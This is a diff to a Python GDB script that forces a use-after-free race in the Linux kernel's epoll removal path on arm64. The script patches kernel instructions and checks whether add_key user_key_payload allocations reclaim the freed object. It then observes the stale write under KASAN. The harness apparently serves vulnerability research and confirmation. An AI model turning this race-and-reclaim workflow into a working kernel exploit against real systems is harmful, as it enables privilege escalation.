@@ -1,5 +1,8 @@
 import gdb
 import time
+import threading
+import os
+import signal
 
 def run_race():
     print("\n=== STARTING CONTROLLED UAF RACE EXPERIMENT ===\n")
@@ -25,7 +28,7 @@ def run_race():
     print("[*] Setting breakpoint at ep_remove (f_ep = NULL)")
     gdb.execute(f"break *{ep_remove_store}")
     
-    # Wait for the exact ep_remove that targets our inner_epoll (where f_op == eventpoll_fops)
+    # Wait for the exact ep_remove that targets our inner_epoll
     while True:
         gdb.execute("continue")
         pc = int(gdb.parse_and_eval("$pc"))
@@ -38,7 +41,6 @@ def run_race():
             else:
                 print(f"[*] Hit ep_remove on non-epoll file. Continuing...")
     
-    # We hit the store. Thread A is now here.
     gdb.execute(f"clear *{ep_remove_store}")
     
     thread_a = gdb.selected_thread().num
@@ -48,9 +50,9 @@ def run_race():
     print(f"[*] inner_epoll: {hex(inner_epoll)}")
     
     # 2. Patch instructions to dmb sy; b .
-    print(f"[*] Patching instruction at {hex(ep_remove_patch1)} to dmb sy (0xd5033fbf)")
+    print(f"[*] Patching instruction at {hex(ep_remove_patch1)} to dmb sy")
     gdb.execute(f"set {{unsigned int}}{ep_remove_patch1} = {dmb_sy_insn}")
-    print(f"[*] Patching instruction at {hex(ep_remove_patch2)} to b . (0x14000000)")
+    print(f"[*] Patching instruction at {hex(ep_remove_patch2)} to b .")
     gdb.execute(f"set {{unsigned int}}{ep_remove_patch2} = {spin_insn}")
     
     # 3. Set breakpoint at ep_free
@@ -77,7 +79,7 @@ def run_race():
                 break
             else:
                 print(f"[!] Thread B hit ep_free, but with different ep (0x{ep_arg:x}). Continuing...")
-    # Thread B reached ep_free. Make sure it finishes kfree.
+                
     gdb.execute(f"clear *{ep_free_addr}")
     print("[*] Setting breakpoint after kfree")
     gdb.execute(f"break *{kfree_call_addr + 4}")
@@ -85,18 +87,12 @@ def run_race():
     gdb.execute(f"clear *{kfree_call_addr + 4}")
     print(f"[*] SUCCESS: Thread B finished kfree(inner_epoll)")
     
-    print("[*] Monitoring Thread B heap spray allocations...")
-    # Break immediately after kvmalloc_node returns inside __arm64_sys_add_key
-    alloc_ret_addr = 0xffffffc00859ce04
+    # ONLY tracking the persistent user_key_payload kmalloc return
+    alloc_ret_addr = 0xffffffc0085a17e4
     gdb.execute(f"break *{alloc_ret_addr}")
     
-    import threading
-    import os
-    import signal
-    import time
-    
     def interrupt_gdb():
-        time.sleep(10.0)
+        time.sleep(60.0)
         os.kill(os.getpid(), signal.SIGINT)
         
     threading.Thread(target=interrupt_gdb).start()
@@ -105,9 +101,7 @@ def run_race():
     victim_address = inner_epoll
     hit_victim = False
     
-    # We will break at kvmalloc_node return, and if we hit the victim, we set a flag and trace the rest of the function.
-    # The return from sys_add_key is 0xffffffc00859ced4 (ret instruction). Let's trace it.
-    sys_add_key_ret = 0xffffffc00859ced4
+    print(f"[*] Monitoring user_key_payload allocations (looking for {hex(victim_address)})...")
     
     while alloc_count < 256:
         try:
@@ -126,30 +120,19 @@ def run_race():
             untagged_victim = victim_address & 0x00ffffffffffffff
             
             if untagged_ret == untagged_victim:
-                print(f"[!] CASE B: ALLOCATION {alloc_count} RETURNED EXACT VICTIM ADDRESS!")
+                print(f"[!] CASE B: ALLOCATION {alloc_count} (user_key_payload) RETURNED EXACT VICTIM ADDRESS!")
                 print(f"    Victim: {hex(victim_address)} | Allocated: {hex(ret_addr)} | Thread: {thr_num}")
                 hit_victim = True
                 break
-            else:
-                print(f"[*] Alloc {alloc_count}: returned {hex(ret_addr)} (Thread {thr_num})")
                 
-    if hit_victim:
-        print("[*] Hit victim address. Setting breakpoint at sys_add_key return.")
-        gdb.execute(f"break *{sys_add_key_ret}")
-        gdb.execute("continue")
-        
-        pc_ret = int(gdb.parse_and_eval("$pc"))
-        if pc_ret == sys_add_key_ret:
-            ret_val = int(gdb.parse_and_eval("$x0"))
-            if ret_val & 0x8000000000000000:
-                ret_val = -((~ret_val + 1) & 0xffffffffffffffff)
-            print(f"[*] sys_add_key returned: {ret_val}")
-        gdb.execute(f"clear *{sys_add_key_ret}")
                 
     gdb.execute(f"clear *{alloc_ret_addr}")
-    print("[*] Syscall diagnostic complete.")
+    print(f"[*] Syscall diagnostic complete. Monitored {alloc_count} allocations.")
     
-    # 5. Restore Thread A's instructions and set its PC back to the cmp instruction
+    if not hit_victim:
+        print("[!] Did not observe victim address reallocation.")
+    
+    # 5. Restore Thread A's instructions and set its PC back
     print(f"[*] Switching back to Thread A ({thread_a})")
     gdb.execute(f"thread {thread_a}")
     
@@ -163,7 +146,17 @@ def run_race():
     # 6. Break at UAF write
     print("[*] Setting breakpoint at UAF write instruction")
     gdb.execute(f"break *{uaf_write_addr}")
-    gdb.execute("continue")
+    
+    def interrupt_gdb_write():
+        time.sleep(2.0)
+        os.kill(os.getpid(), signal.SIGINT)
+        
+    threading.Thread(target=interrupt_gdb_write).start()
+    
+    try:
+        gdb.execute("continue")
+    except gdb.error:
+        pass
     
     pc = int(gdb.parse_and_eval("$pc"))
     if pc == uaf_write_addr:
@@ -177,15 +170,39 @@ def run_race():
         if x0 == inner_epoll + 0xa0:
             print("[*] EXACT MATCH! The write targets the freed inner_epoll allocation.")
             
+        print("\n[*] MEMORY BEFORE UAF WRITE (around offset 0xa0):")
+        try:
+            gdb.execute(f"x/4gx {inner_epoll} + 0x90")
+        except Exception as e:
+            print(f"[*] Could not read memory: {e}")
+            
         print("\n=== EXECUTING UAF WRITE ===")
-        gdb.execute("stepi")
+        # We need to temporarily disable KASAN trap or just execute and see if we can read memory
+        # Wait, stepi on a KASAN trapped instruction might just jump to the exception handler.
+        # Let's do stepi and then check memory if possible.
+        try:
+            gdb.execute("stepi")
+        except Exception as e:
+            pass
         print("=== UAF WRITE EXECUTED ===\n")
         
+        print("[*] MEMORY AFTER UAF WRITE (around offset 0xa0):")
+        try:
+            gdb.execute(f"x/4gx {inner_epoll} + 0x90")
+        except Exception as e:
+            print(f"[*] Could not read memory: {e}")
+        
         print("[*] Resuming execution to allow KASAN report to print...")
+        
+        def interrupt_gdb_end():
+            time.sleep(5.0)
+            os.kill(os.getpid(), signal.SIGINT)
+        threading.Thread(target=interrupt_gdb_end).start()
+        
         try:
             gdb.execute("continue")
-        except gdb.error as e:
-            print(f"[*] GDB Error during continue: {e}")
+        except gdb.error:
+            pass
     else:
         print(f"[!] Thread A stopped at {hex(pc)} instead of UAF write")
         
@@ -197,4 +214,3 @@ except Exception as e:
     import traceback
     traceback.print_exc()
     gdb.execute("quit")
-
